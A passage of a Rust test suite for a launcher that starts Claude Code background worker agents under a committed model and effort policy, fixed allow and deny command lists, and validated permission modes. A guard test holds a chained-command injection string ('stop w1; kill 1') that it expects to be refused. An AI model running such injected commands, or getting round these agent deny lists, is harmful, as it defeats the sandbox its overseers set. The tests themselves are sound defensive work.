        ("[router]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "missing worker_model"),
        (&ok_policy.replace("[router]\n", "[router]# c\n"), "no space before the header's comment"),
        (&format!("{ok_policy}\t[router]\n"), "tab-indented second header"),
        (&format!("{ok_policy}[\trouter]\n"), "tab inside a second header"),
        (&format!("{ok_policy}[router\t]\n"), "tab before a second header's ]"),
        (&ok_policy.replace("worker_model", "  worker_model"), "indented worker_model"),
        (&ok_policy.replace("worker_default_effort", "  worker_default_effort"), "indented worker_default_effort"),
        (&ok_policy.replace("worker_efforts", "  worker_efforts"), "indented worker_efforts"),
        (&ok_policy.replace("\"opus\"", "\"opus\" x"), "junk after worker_model"),
        (&ok_policy.replace("= \"medium\"\n", "= \"medium\" x\n"), "junk after worker_default_effort"),
        (&ok_policy.replace("\"high\"]", "\"high\"] x"), "junk after worker_efforts"),
        (&ok_policy.replace("worker_model = ", "worker_model  =  "), "two spaces around = (model)"),
        (&ok_policy.replace("worker_default_effort = ", "worker_default_effort  =  "), "two spaces around = (default)"),
        (&ok_policy.replace("worker_efforts = ", "worker_efforts  =  "), "two spaces around = (efforts)"),
        (&ok_policy.replace("worker_efforts = ", "worker_efforts= "), "no space before = (efforts)"),
        (&format!("{ok_policy}worker_default_effort = \"medium\"\n"), "repeated worker_default_effort"),
        (&format!("{ok_policy}worker_efforts = [\"medium\", \"high\"]\n"), "repeated worker_efforts"),
        (&ok_policy.replace("\"opus\"", "\"opus x\""), "model with a space"),
        (&ok_policy.replace("\"opus\"", "\"opUs\""), "model with a capital"),
        (&ok_policy.replace("= \"medium\"\n", "= \"medium high\"\n"), "default with a space"),
        (&ok_policy.replace("[\"medium\", \"high\"]", "[\"medium high\"]"), "list entry with a space"),
        (&ok_policy.replace("\"high\"]", "\"high medium\"]"), "later list entry with a space"),
        (&ok_policy.replace("\"medium\", \"high\"", "\"medium\",  \"high\""), "two spaces after a comma"),
        (&ok_policy.replace("\"high\"]", "\"below\"]"), "level word below"),
        (&ok_policy.replace("\"high\"]", "\"highest\"]"), "level word highest"),
    ] {
        policy_refusals.push((Some(bad.to_string()), what.to_string()));
    }
    for (config, what) in policy_refusals {
        l.commit_config(config.as_deref());
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus"]);
        assert!(!ok && out.contains("no worker policy: [router] worker_model / worker_efforts / worker_default_effort in .keel/config.toml at HEAD of"), "{what}: {out}");
        assert_eq!(l.starts("q"), 0, "{what}: started a worker");
    }

    // an uncommitted edit, even staged, cannot widen the committed policy
    l.commit_config(Some("[router]   # comment\nworker_model = \"opus\"  # trailing\n\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n[next]\nx = 1\n"));
    std::fs::write(l.main.join(".keel/config.toml"), "[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"max\"]\nworker_default_effort = \"max\"\n").unwrap();
    git(&l.main, &["add", ".keel"]);
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(!ok && out.contains("model must be opus"), "{out}");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus", "--effort", "max"]);
    assert!(!ok && out.contains("effort must be one of: medium high"), "{out}");

    // the launcher enforces whatever the committed policy says; it hardcodes no model
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\"]\nworker_default_effort = \"high\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus"]);
    assert!(!ok && out.contains("model must be sonnet ([router] worker_model"), "{out}");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=high "), "{out}");
    l.stop("q");

    // the accepted efforts are the committed list, not a built-in one: narrowed, medium is refused;
    // widened, max is accepted
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "medium"]);
    assert!(!ok && out.contains("effort must be one of: high ("), "{out}");
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\", \"max\"]\nworker_default_effort = \"high\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "max"]);
    assert!(ok && out.contains(" effort=max "), "{out}");
    l.stop("q");
    assert_eq!(option(&worker_argv(&l.state, "q"), "--effort"), "max");

    // the default is worker_default_effort, not the list's first entry, read from HEAD on a branch
    // other than main
    git(&l.main, &["checkout", "-qb", "router"]);
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\", \"medium\"]\nworker_default_effort = \"medium\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=medium "), "{out}");
    l.stop("q");
    assert_eq!(option(&worker_argv(&l.state, "q"), "--effort"), "medium");

    // every level word is accepted when committed: low and xhigh, as the default and as --effort (review r5 V1)
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"low\", \"xhigh\"]\nworker_default_effort = \"low\"\n"));
    for (extra, effort) in [(vec![], "low"), (vec!["--effort", "xhigh"], "xhigh")] {
        let mut args = vec!["spawn", "q", wt, brief, "sonnet"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(&format!(" effort={effort} ")), "{out}");
        l.stop("q");
        assert_eq!(option(&worker_argv(&l.state, "q"), "--effort"), effort);
    }

    // the reader's accepted edges in one policy: a tab before the header's comment, a dotted and
    // hyphenated model, trailing blanks after a value, a three-entry list, and indented or similarly
    // named headers that end the section
    l.commit_config(Some("[router]\t# c\nworker_model = \"opus-4.5\" \t\nworker_efforts = [\"low\", \"medium\", \"xhigh\"]\nworker_default_effort = \"low\"\n\t[next]\nx = 1\n  [routers]\ny = 2\n"));
    for effort in ["low", "medium", "xhigh"] {
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus-4.5", "--effort", effort]);
        assert!(ok && out.contains(&format!(" effort={effort} ")), "{out}");
        l.stop("q");
    }
    // an effort matches a whole list entry, never part of one
    for part in ["med", "igh", "low medium"] {
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus-4.5", "--effort", part]);
        assert!(!ok && out.contains("effort must be one of: low medium xhigh ("), "{part}: {out}");
    }
}

/// DEC-39: the repo's committed worker policy is opus at medium or high effort, medium by default.
#[test]
fn committed_worker_policy_is_opus_at_medium_or_high_effort_with_a_haiku_watchdog() {
    let config = std::fs::read_to_string(root().join(".keel/config.toml")).unwrap();
    let section: Vec<&str> = config
        .lines()
        .skip_while(|l| !l.starts_with("[router]"))
        .skip(1)
        .take_while(|l| !l.starts_with('['))
        .filter(|l| !l.trim().is_empty())
        .collect();
    assert_eq!(section, ["worker_model = \"opus\"", "worker_efforts = [\"medium\", \"high\"]", "worker_default_effort = \"medium\"", "watchdog_model = \"haiku\""]);
}

const WORKER_GRANTS: [&str; 11] = [
    "cargo build",
    "cargo test",
    "cargo check",
    "cargo clippy",
    "cargo fmt",
    "keel preflight",
    "keel verify-doc",
    "keel verify-dod",
    "keel notes write",
    "keel lint",
    "keel check",
];
/// Denied to every worker, each as `Bash(c)` and `Bash(c *)` (E-ROUTER3.W8, DEC-46).
const WORKER_DENIES: [&str; 25] = [
    "keel mr",
    "cargo run",
    "keel init",
    "keel hooks",
    "cargo install",
    "cargo publish",
    "cargo login",
    "git push",
    "git config",
    "git update-ref",
    "git symbolic-ref",
    "git stash",
    "git notes",
    "git switch",
    "git checkout",
    "git rebase",
    "git worktree add",
    "git worktree remove",
    "git worktree move",
    "git worktree prune",
    "git -C",
    "git --git-dir",
    "git --work-tree",
    "claude",
    "scripts/router-worker.sh",
];

fn bash_pairs<'a>(cmds: impl IntoIterator<Item = &'a str>) -> Vec<String> {
    cmds.into_iter().flat_map(|c| [format!("Bash({c})"), format!("Bash({c} *)")]).collect()
}

/// The argv of the latest background session the stub started under <name>. Every spawned worker gets
/// exactly these options once each, in this order, with the fixed grant/deny lists, and the fixed
/// prompt last, after a single-valued option (after a list option it would be read as a tool name);
/// an extra `--allowedTools Bash(*)`, a bypass flag, `-p` or a stream flag fails here.
fn worker_argv(state: &Path, name: &str) -> Vec<String> {
    argv_of(state, name, false)
}

/// As `worker_argv`, for a worker spawned with `--review` (`review`) or without.
fn argv_of(state: &Path, name: &str, review: bool) -> Vec<String> {
    let (_, a) = calls(state)
        .into_iter()
        .rfind(|(_, a)| a[0] == "--bg" && a.windows(2).any(|w| w[0] == "-n" && w[1] == name))
        .unwrap_or_else(|| panic!("no session started for {name}"));
    let flags: Vec<&str> = a.iter().map(String::as_str).filter(|x| x.starts_with('-')).collect();
    assert_eq!(
        flags,
        [
            "--bg",
            "-n",
            "--model",
            "--effort",
            "--agent",
            "--setting-sources",
            "--strict-mcp-config",
            "--settings",
            "--allowedTools",
            "--disallowedTools",
            "--permission-mode"
        ],
        "{name}: options in {a:?}"
    );
    assert_eq!(option(&a, "--agent"), "worker");
    assert_eq!(option(&a, "--setting-sources"), "project,local");
    assert_eq!(a[a.len() - 3], "--permission-mode", "{name}: the prompt must follow --permission-mode's value: {a:?}");
    assert!(a[a.len() - 1].starts_with("You are a fresh worker session. Read "), "{a:?}");
    let list = |flag: &str| -> Vec<String> {
        let i = a.iter().position(|x| x == flag).unwrap();
        a[i + 1..].iter().take_while(|x| !x.starts_with('-')).cloned().collect()
    };
    let mut allow = bash_pairs(WORKER_GRANTS);
    let mut deny = bash_pairs(WORKER_DENIES);
    deny.extend(["Bash(git --git-dir=*)", "Bash(git --work-tree=*)"].map(String::from));
    if review {
        allow.extend(bash_pairs(["keel notes write cr"]));
        deny.extend(bash_pairs(["git add", "git commit"]));
        deny.extend(["Edit", "Write", "NotebookEdit"].map(String::from));
    } else {
        deny.extend(bash_pairs(["keel notes write cr"]));
    }
    assert_eq!(list("--allowedTools"), allow, "{name}: allow list");
    assert_eq!(list("--disallowedTools"), deny, "{name}: deny list");
    a
}

/// The value after `flag` in an argv.
fn option(a: &[String], flag: &str) -> String {
    a[a.iter().position(|x| x == flag).unwrap() + 1].clone()
}

/// E-ROUTERFIX.W1: workers were refused cargo/keel, and the launcher hardcoded acceptEdits. The grant
/// travels on the launcher's argv only; the mode is a validated per-run option. E-ROUTER3.W10: the
/// worker is one `claude --bg` started in its worktree, with no print-mode, stream or budget flag.
#[test]
fn launcher_starts_a_worker_as_a_background_session_with_the_grant_and_a_validated_mode() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    let mode_of = |name: &str| {
        l.stop(name);
        let a = worker_argv(&l.state, name);
        option(&a, "--permission-mode")
    };
    let run_dir = |name: &str, kind: &str, file: &str| {
        let runs = std::fs::read_dir(l.main.join(".router/runs")).unwrap();
        let mut values: Vec<String> = runs
            .map(|e| e.unwrap().path())
            .filter(|p| {
                let f = p.file_name().unwrap().to_str().unwrap();
                f.starts_with(&format!("{name}-")) && f.ends_with(&format!("-{kind}"))
            })
            .filter_map(|p| std::fs::read_to_string(p.join(file)).ok().map(|v| v.trim().to_string()))
            .collect();
        values.sort();
        values
    };
    let run_dir_mode = |name: &str, kind: &str| run_dir(name, kind, "permission-mode");
    let run_dir_effort = |name: &str, kind: &str| run_dir(name, kind, "effort");

    for (i, (extra, why)) in [
        (vec!["--permission-mode", "bypassPermissions"], "permission mode must be"),
        (vec!["--permission-mode", "dontAsk"], "permission mode must be"),
        (vec!["--permission-mode", "default"], "permission mode must be"),
        (vec!["--permission-mode", ""], "permission mode must be"),
        (vec!["--permission-mode"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--bogus", "x"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--permission-mode", "plan", "x"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--effort", "low"], "effort must be one of: medium high ([router] worker_efforts in .keel/config.toml)"),
        (vec!["--effort", "max"], "effort must be one of: medium high"),
        (vec!["--effort", "ultracode"], "effort must be one of: medium high"),
        (vec!["--effort", "medium high"], "effort must be one of: medium high"),
        (vec!["--effort", ""], "effort must be one of: medium high"),
        (vec!["--effort"], "[--effort <level>]"),
        (vec!["--effort", "high", "--effort", "high"], "[--effort <level>]"),
        (vec!["--permission-mode", "plan", "--permission-mode", "plan"], "[--effort <level>]"),
        (vec!["--permission-mode", "plan", "--effort"], "[--effort <level>]"),
        (vec!["--effort", "high", "--permission-mode", "plan", "x", "y"], "[--effort <level>]"),
    ]
    .into_iter()
    .enumerate()
    {
        let name = format!("r{i}");
        let mut args = vec!["spawn", &name, wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains(why), "{extra:?} not refused for {why}: {out}");
        assert_eq!(l.starts(&name), 0, "{extra:?} started a worker");
    }

    let (ok, out) = l.run(&["spawn", "d", wt, brief, "opus"]);
    assert!(ok && out.contains("permission-mode=acceptEdits"), "{out}");
    let (dir, _) = calls(&l.state).into_iter().rfind(|(_, a)| a[0] == "--bg").unwrap();
    assert_eq!(dir, wt, "the worker runs in its worktree");
    assert!(field(&out, "brief=").starts_with(wt) && worker_argv(&l.state, "d").last().unwrap().contains(field(&out, "brief=")), "{out}");
    let (ok, out) = l.run(&["spawn", "p", wt, brief, "opus", "--permission-mode", "plan"]);
    assert!(ok && out.contains("permission-mode=plan"), "{out}");

    assert_eq!(mode_of("d"), "acceptEdits");
    assert_eq!(mode_of("p"), "plan");
    assert_eq!(run_dir_mode("d", "spawn"), ["acceptEdits"]);
    assert_eq!(run_dir_mode("p", "spawn"), ["plan"]);

    // E-SEED2.W7: effort is medium by default, high when asked, in either order with the mode; it
    // lands on the RUNNING line, in the run dir and after --model on the argv
    let effort_of = |name: &str| {
        l.stop(name);
        let a = worker_argv(&l.state, name);
        assert_eq!(option(&a, "--model"), "opus");
        (option(&a, "--effort"), option(&a, "--permission-mode"))
    };
    for (name, extra, effort, mode) in [
        ("e1", vec![], "medium", "acceptEdits"),
        ("e2", vec!["--effort", "high"], "high", "acceptEdits"),
        ("e3", vec!["--effort", "high", "--permission-mode", "plan"], "high", "plan"),
        ("e4", vec!["--permission-mode", "plan", "--effort", "medium"], "medium", "plan"),
    ] {
        let mut args = vec!["spawn", name, wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(&format!(" permission-mode={mode} effort={effort} ")), "{extra:?}: {out}");
        assert_eq!(effort_of(name), (effort.to_string(), mode.to_string()), "{extra:?}");
        assert_eq!(run_dir_effort(name, "spawn"), [effort], "{extra:?}");
    }

    // router side: the guard admits the option on the launcher shape, and the grant never reaches it
    assert_eq!(bash("scripts/router-worker.sh spawn n /w .router/briefs/n.md opus --permission-mode plan"), None);
    assert_eq!(bash("scripts/router-worker.sh spawn n /w .router/briefs/n.md opus --effort high --permission-mode plan"), None);
    for c in WORKER_GRANTS {
        assert!(bash(&format!("{c} x")).is_some(), "router may run {c}");
    }
}

/// Blockers 3-4 of the close review: the shipped PUSHED probe fired before anything was pushed
/// (equality with local main), and worker-ops' variant never fired for an epic (equality with the
/// signed tip, which a --no-ff merge does not push). It must be false when staged, false when merged
/// locally, true once pushed.
#[test]
fn pushed_probe_fires_only_after_the_merge_reaches_origin() {
    let cmds = std::fs::read_to_string(root().join("skills/keel-router/references/commands.md")).unwrap();
    let line = cmds.lines().find(|l| l.trim_end().ends_with("echo PUSHED")).expect("no PUSHED probe in commands.md");
    let probe = line.strip_prefix("until ").unwrap().split("; do").next().unwrap();
    let ops = std::fs::read_to_string(root().join("skills/keel-router/references/worker-ops.md")).unwrap();
    let row = ops.lines().find(|l| l.starts_with("| pushes")).unwrap();
    assert!(row.contains("merge-base --is-ancestor <tip> origin/<b>"), "worker-ops push probe drifted from commands.md: {row}");

    let d = TempDir::new().unwrap();
    let origin = d.path().join("origin.git");
    let main = d.path().join("main");
    git(d.path(), &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(d.path(), &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    git(&main, &["switch", "-q", "-c", "epic/E-X"]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "epic work"]);
    let t = String::from_utf8(git(&main, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    git(&main, &["switch", "-q", "main"]);
    let fires = || hermetic(&mut common::cmd("sh")).args(["-c", probe]).env("MAIN", &main).env("T", &t).output().unwrap().status.success();

    assert!(!fires(), "PUSHED fired when the action was only staged");
    git(&main, &["merge", "-q", "--no-ff", "-m", "merge epic", "epic/E-X"]);
    assert!(!fires(), "PUSHED fired before the push");
    git(&main, &["push", "-q", "origin", "main"]);
    assert!(fires(), "PUSHED did not fire after the push");
}

/// Bounded wait for a condition another process brings about.
fn until(what: &str, mut cond: impl FnMut() -> bool) {
    let t = Instant::now();
    while !cond() {
        assert!(t.elapsed() < BOUND, "timed out waiting for {what}");
        std::thread::sleep(Duration::from_millis(10));
    }
}

/// A watch run by a test, its polls stepped through the `sleep` shim.
struct Stepped {
    child: std::process::Child,
    dir: PathBuf,
}

impl Stepped {
    /// Block until the watch has judged poll n and is sleeping; panics with its line if it returned instead.
    fn at(&mut self, n: u32) {
        let polls = || std::fs::read_to_string(self.dir.join("polls")).ok().and_then(|s| s.trim().parse::<u32>().ok());
        let t = Instant::now();
        while polls() != Some(n) {
            if self.child.try_wait().unwrap().is_some() {
                let mut out = String::new();
                std::io::Read::read_to_string(self.child.stdout.as_mut().unwrap(), &mut out).unwrap();
                panic!("watch returned before poll {n}: {out}");
            }
            assert!(t.elapsed() < BOUND, "watch never reached poll {n}");
            std::thread::sleep(Duration::from_millis(10));
        }
    }


    fn go(&self, n: u32) {
        std::fs::write(self.dir.join(format!("go-{n}")), "").unwrap();
    }

    /// The one line the watch prints once released from its last poll.
    fn line(self) -> String {
        let o = self.output();
        assert!(o.status.success(), "{o:?}");
        String::from_utf8(o.stdout).unwrap()
    }

    /// Everything the process left once released from its last poll; panics after BOUND.
    fn output(mut self) -> Output {
        let t = Instant::now();
        while self.child.try_wait().unwrap().is_none() {
            assert!(t.elapsed() < BOUND, "watch never returned");
            std::thread::sleep(Duration::from_millis(10));
        }
        let read = |p: Option<&mut dyn std::io::Read>| {
            let mut b = Vec::new();
            if let Some(p) = p {
                p.read_to_end(&mut b).unwrap();
            }
            b
        };
        let stdout = read(self.child.stdout.as_mut().map(|p| p as &mut dyn std::io::Read));
        let stderr = read(self.child.stderr.as_mut().map(|p| p as &mut dyn std::io::Read));
        Output { status: self.child.wait().unwrap(), stdout, stderr }
    }
}

/// However a test ends, its watch and the `sleep` shim under it end with it.
impl Drop for Stepped {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

/// A command bounded by BOUND: a hung script fails the test instead of hanging it. Returns stdout then stderr; a non-zero exit fails the test with both.
fn bounded(mut c: Command) -> String {
    let mut p = c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
    let t = Instant::now();
    while p.try_wait().unwrap().is_none() {
        if t.elapsed() > BOUND {
            p.kill().unwrap();
            panic!("{c:?}: no result within {BOUND:?}");
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    let o = p.wait_with_output().unwrap();
    let out = format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr));
    assert!(o.status.success(), "{c:?}: {out}");
    out
}

/// E-ROUTER3.W10: a start the CLI refuses (an untrusted worktree: "Workspace not trusted") or one that
/// never shows in the session list is DEAD, with the CLI's own text, and exits 1.
#[test]
fn a_start_the_cli_refuses_is_reported_dead_with_its_reason() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let why = "Workspace not trusted. Run `claude` in the worktree once and accept the trust prompt, then retry.";
    std::fs::write(l.state.join("refuse"), format!("{why}\n")).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/b.md", "opus"]);
    assert!(!ok && out.starts_with("DEAD name=n exit=1 snapshot=") && out.contains(why), "{out}");
    std::fs::remove_file(l.state.join("refuse")).unwrap();

    // E-ROUTER3.W10 review r1 B1: a session list the CLI fails to give is no list, never "no sessions":
    // spawn must not take the name as free, nor stop report the worker gone
    std::fs::write(l.state.join("agents-ok"), "0").unwrap();
    let started = l.starts("n");
    for args in [vec!["spawn", "n", wt, ".router/briefs/b.md", "opus"], vec!["stop", "n"]] {
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains("cannot list sessions (claude agents --json)"), "{args:?}: {out}");
    }
    assert_eq!(l.starts("n"), started, "a failed listing started a worker");

    // review r2: a listing that fails once the session has started reports it as possibly running,
    // with its snapshot, never as refused before any start
    std::fs::write(l.state.join("agents-ok"), "1").unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/b.md", "opus"]);
    assert!(!ok && out.starts_with("UNLISTED name=n exit=0 snapshot=") && out.contains("backgrounded") && out.contains("the session may be running"), "{out}");
    std::fs::remove_file(l.state.join("agents-ok")).unwrap();
    assert!(l.sessions().iter().any(|r| r["name"] == "n"), "the stub did start it");
    l.set_sessions(&[]);

    // listed never: the launcher's polls run through an instant `sleep`
    std::fs::write(l.state.join("unlisted"), "").unwrap();
    let path = l.fast_path();
    let (ok, out) = l.run_env(&["spawn", "n", wt, ".router/briefs/b.md", "opus"], &[("PATH", &path)]);
    assert!(!ok && out.starts_with("DEAD name=n exit=0 ") && out.contains("backgrounded"), "{out}");
}

/// E-ROUTER3.W10: `stop` closes the named idle worker of this repository by its id, `claude stop` then
/// `claude rm`, and refuses everything else before calling the CLI: a busy worker (stopping cuts its
/// turn), an unlisted name, a session outside this repository's worktrees, an interactive session, an
/// ambiguous name.
#[test]
fn stop_stops_then_removes_this_repositorys_idle_worker_by_id() {
    let l = launcher();
    let brief = ".router/briefs/b.md";
    assert!(l.run(&["spawn", "a", l.wt.to_str().unwrap(), brief, "opus"]).0);
    assert!(l.run(&["spawn", "b", l.wt2.to_str().unwrap(), brief, "opus"]).0);
    let mut rows = l.sessions();
    let id = |n: &str| rows.iter().find(|r| r["name"] == n).unwrap()["id"].as_str().unwrap().to_string();
    let (a, b) = (id("a"), id("b"));
    rows.iter_mut().find(|r| r["name"] == "b").unwrap()["status"] = "busy".into();
    let wt = l.wt.to_str().unwrap();
    rows.push(serde_json::json!({"id": "c0", "sessionId": "c0-x", "name": "c", "cwd": "/elsewhere", "kind": "background", "status": "idle"}));
    rows.push(serde_json::json!({"id": "d0", "sessionId": "d0-x", "name": "d", "cwd": wt, "kind": "interactive", "status": "idle"}));
    rows.push(serde_json::json!({"id": "e0", "sessionId": "e0-x", "name": "e", "cwd": wt, "kind": "background", "status": "idle"}));
    rows.push(serde_json::json!({"id": "e1", "sessionId": "e1-x", "name": "e", "cwd": wt, "kind": "background", "status": "idle"}));
    l.set_sessions(&rows);
    let before = calls(&l.state).len();
    let path = l.fast_path();
    for (name, why) in [
        ("b", format!("worker b is still busy: stopping it would cut its turn; the owner decides (claude stop {b})")),
        ("z", "worker z is not running".to_string()),
        ("c", "c runs outside this repository's worktrees (/elsewhere)".to_string()),
        ("d", "d is not a background session".to_string()),
        ("e", "more than one session is named e".to_string()),
    ] {
        let (ok, out) = l.run_env(&["stop", name], &[("PATH", &path)]);
        assert!(!ok && out.contains(&why), "{name}: {out}");
    }
    assert!(calls(&l.state)[before..].iter().all(|(_, c)| c[0] == "agents"), "a refused stop called the CLI");

    let (ok, out) = l.run(&["stop", "a"]);
    assert!(ok, "{out}");
    let sid = rows.iter().find(|r| r["name"] == "a").unwrap()["sessionId"].as_str().unwrap().to_string();
    assert_eq!(out, format!("STOPPED name=a id={a} session={sid}\n"));
    let tail: Vec<Vec<String>> = calls(&l.state).into_iter().map(|(_, c)| c).filter(|c| c[0] != "agents").collect();
    assert_eq!(tail[tail.len() - 2..], [vec!["stop".to_string(), a.clone()], vec!["rm".to_string(), a]]);
    assert!(l.sessions().iter().all(|r| r["name"] != "a") && l.sessions().iter().any(|r| r["name"] == "b"));

    // review r2: Claude Code lists a blocked session (rate-limited, or waiting on its user) with a
    // state and no status: it is refused at once by that state, as a worker waiting on a prompt is
    let mut more = rows.clone();
    more.push(serde_json::json!({"id": "f0", "sessionId": "f0-x", "name": "f", "cwd": wt, "kind": "background", "state": "blocked"}));
    more.push(serde_json::json!({"id": "g0", "sessionId": "g0-x", "name": "g", "cwd": wt, "kind": "background", "status": "waiting", "waitingFor": "permission prompt", "state": "blocked"}));
    l.set_sessions(&more);
    for (name, state, id) in [("f", "blocked", "f0"), ("g", "waiting", "g0")] {
        let n0 = calls(&l.state).len();
        let (ok, out) = l.run_env(&["stop", name], &[("PATH", &path)]);
        assert!(!ok && out.contains(&format!("worker {name} is {state}: the owner decides (claude stop {id})")), "{name}: {out}");
        assert_eq!(calls(&l.state).len() - n0, 1, "{name}: stop waited on a session that is not busy");
    }
    l.set_sessions(&rows);

    // review r2: the busy wait follows the worker's id, never another session that takes its name,
    // and a listing that fails inside the wait stops it
    std::fs::write(l.state.join("swap"), "").unwrap();
    let (ok, out) = l.run_env(&["stop", "b"], &[("PATH", &path)]);
    assert!(!ok && out.contains("worker b left the session list while busy; nothing to stop"), "{out}");
    assert!(calls(&l.state).iter().all(|(_, c)| c[0] != "stop" || c[1] != "new0"), "stop closed the session that took the name");
    std::fs::remove_file(l.state.join("swap")).unwrap();
    l.set_sessions(&rows);
    std::fs::write(l.state.join("agents-ok"), "1").unwrap();
    let (ok, out) = l.run_env(&["stop", "b"], &[("PATH", &path)]);
    assert!(!ok && out.contains("cannot list sessions (claude agents --json)"), "{out}");
    std::fs::remove_file(l.state.join("agents-ok")).unwrap();

    // review r1 I1: a busy worker whose session ends while stop waits is gone, said at once, not after 30s
    std::fs::write(l.state.join("vanish"), "").unwrap();
    let n0 = calls(&l.state).len();
    let (ok, out) = l.run_env(&["stop", "b"], &[("PATH", &path)]);
    assert!(!ok && out.contains("worker b left the session list while busy; nothing to stop"), "{out}");
    assert_eq!(calls(&l.state).len() - n0, 2, "stop kept polling a gone session");
    std::fs::remove_file(l.state.join("vanish")).unwrap();
    l.set_sessions(&rows);

    // live run 2026-11-11: a worker's report arrives while its turn is still ending, so the router's
    // stop right after it finds the worker busy; stop waits (bounded) for the turn to end
    std::fs::write(l.state.join("settle"), "").unwrap();
    let (ok, out) = l.run_env(&["stop", "b"], &[("PATH", &path)]);
    assert!(ok && out.starts_with(&format!("STOPPED name=b id={b} ")), "{out}");
}

/// E-ROUTER3.W10 (owner ruling 2026-11-11): `wait` and `send` are gone, with every file under
/// .router/out: a spawn and a stop leave only the brief and its run dir. E-ROUTER3.W8 (owner ruling
/// 2026-11-11, probe P3 i): `resume` is gone too: a plain `--bg --resume` drops every launch flag.
#[test]
fn launcher_has_only_its_modes_and_writes_no_out_dir() {
    let l = launcher();
    for args in [
        vec!["wait", "n"],
        vec!["send", "n", ".router/briefs/b.md"],
        vec!["brief", "n", ".router/briefs/b.md"],
        vec!["resume", "n", "0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b", l.wt.to_str().unwrap(), ".router/briefs/b.md"],
    ] {
        let o = l.cmd(&args, &[]).output().unwrap();
        assert_eq!(o.status.code(), Some(2), "{args:?}");
        assert!(String::from_utf8_lossy(&o.stderr).contains("spawn|stop|worktree|watchdog"), "{args:?}: {o:?}");
    }
    assert_eq!(calls(&l.state).len(), 0, "an unknown mode called the CLI");
    assert!(l.run(&["spawn", "n", l.wt.to_str().unwrap(), ".router/briefs/b.md", "opus"]).0);
    l.stop("n");
    let mut entries: Vec<String> = std::fs::read_dir(l.main.join(".router")).unwrap().map(|e| e.unwrap().file_name().into_string().unwrap()).collect();
    entries.sort();
    assert_eq!(entries, ["briefs", "runs"]);
    assert_eq!(std::fs::read_dir(l.main.join(".router/runs")).unwrap().count(), 1);
}

/// E-ROUTER3.W10: the router's launcher shapes are spawn and stop in plain words; `wait` and `send`
/// are gone, E-ROUTER3.W8 `resume` too, and nothing else of the script passes.
#[test]
fn router_guard_admits_spawn_and_stop_and_refuses_resume_wait_and_send() {
    for ok in [
        "scripts/router-worker.sh spawn w1 /Users/o/Keel-x .router/briefs/w1.md opus",
        "scripts/router-worker.sh spawn w1 /Users/o/Keel-x .router/briefs/w1.md opus --review",
        "scripts/router-worker.sh stop w1",
    ] {
        assert_eq!(bash(ok), None, "guard denied {ok:?}");
    }
    for no in [
        "scripts/router-worker.sh resume w1 0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b /Users/o/Keel-x .router/briefs/w1-r2.md",
        "scripts/router-worker.sh wait w1",
        "scripts/router-worker.sh send w1 .router/briefs/w1-r2.md",
        "scripts/router-worker.sh brief w1 .router/briefs/w1-r2.md",
        "scripts/router-worker.sh kill w1",
        "scripts/router-worker.sh stopx w1",
        "scripts/router-worker.sh stop \"w1\"",
        "scripts/router-worker.sh stop $HOME",
        "scripts/router-worker.sh stop ../w1",
        "scripts/router-worker.sh stop w1; kill 1",
    ] {
        assert!(bash(no).is_some(), "guard allowed {no:?}");
    }
}

/// A worker's Bash call as Claude Code 2.1.288 delivered it from a `claude --bg --agent worker` session
/// (E-ROUTER3.W10 probe P2; ids and paths replaced): agent_type is "worker", so the router guard
/// passes it untouched, and the session's own permission mode travels with it.
const CAPTURED_BG_WORKER_BASH: &str = r#"{"session_id":"s","transcript_path":"/t.jsonl","cwd":"/w","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"acceptEdits","agent_type":"worker","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"printenv PROBE_MARK","description":"Check PROBE_MARK environment variable"},"tool_use_id":"u1"}"#;

#[test]
fn router_guard_leaves_a_background_workers_calls_alone() {
